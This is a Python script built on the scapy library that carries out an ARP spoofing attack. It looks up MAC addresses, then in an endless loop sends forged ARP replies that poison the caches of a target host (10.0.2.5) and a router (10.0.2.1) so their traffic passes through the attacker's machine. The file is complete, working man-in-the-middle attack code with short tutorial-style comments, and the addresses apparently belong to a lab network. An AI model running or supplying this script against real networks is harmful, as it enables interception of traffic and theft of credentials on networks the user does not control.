#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # scapy.ls(scapy.Ether) ; used to list all the arguments of a function
    # using forward slash("/") we can combine both packets into one packet
    arp_request_bradcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_bradcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # we are setting op to 2 as we need response, setting it to one is a request
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

sent_packets_count = 0
while True:
    # spoof the target
    spoof("10.0.2.5", "10.0.2.1")
    # spoof the router
    spoof("10.0.2.1", "10.0.2.5")
    sent_packets_count += 2
    print(f"[+] Packets sent: {sent_packets_count}")
    time.sleep(2)